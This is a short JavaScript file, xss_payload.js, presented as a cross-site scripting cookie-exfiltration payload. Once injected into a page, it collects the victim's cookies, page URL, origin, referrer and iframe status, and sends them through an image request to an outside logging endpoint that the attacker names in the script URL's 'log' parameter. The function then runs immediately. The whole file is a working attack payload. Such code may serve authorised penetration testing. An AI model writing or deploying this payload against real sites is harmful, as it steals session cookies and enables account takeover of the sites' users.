/*
 * XSS Cookie Exfiltration Payload (Dynamic - pipelock.dev)
 * File: xss_payload.js
 * Requires the 'log' parameter in the script tag to specify the Webhook/Beeceptor endpoint.
 */

function exfiltrateCookie() {
    // 1. Safely find the script tag that executed this code
    const scriptTag = document.currentScript;
    if (!scriptTag) {
        console.error("XSS Payload failed: Could not retrieve script source URL.");
        return;
    }

    const scriptUrl = new URL(scriptTag.src);
    const urlParams = scriptUrl.searchParams;
    
    // 2. Extract the logging endpoint from the 'log' parameter
    const LOG_ENDPOINT_URL = urlParams.get('log'); 
    
    if (!LOG_ENDPOINT_URL) {
        console.error("XSS Payload failed: The 'log=...' parameter is missing from the script URL.");
        return;
    }

    // 3. Collect and encode data, including context
    const stolenCookie = encodeURIComponent(document.cookie);
    const pageUrl = encodeURIComponent(window.location.href);
    const pageOrigin = encodeURIComponent(window.location.origin);
    const referrer = encodeURIComponent(document.referrer || 'N/A');
    const isIframe = (window.top !== window.self) ? 'true' : 'false';

    // Build the exfiltration URL
    const exfilUrl = `${LOG_ENDPOINT_URL}/xss-data` + 
                     `?origin=${pageOrigin}` + 
                     `&page=${pageUrl}` + 
                     `&cookie=${stolenCookie}` + 
                     `&referrer=${referrer}` +
                     `&is_iframe=${isIframe}`;

    // 4. Trigger the data exfiltration to the logging service
    new Image().src = exfilUrl;
    
    console.log(`XSS Payload executed from pipelock.dev. Data sent to: ${LOG_ENDPOINT_URL}`);
}

// Execute the function immediately
exfiltrateCookie();
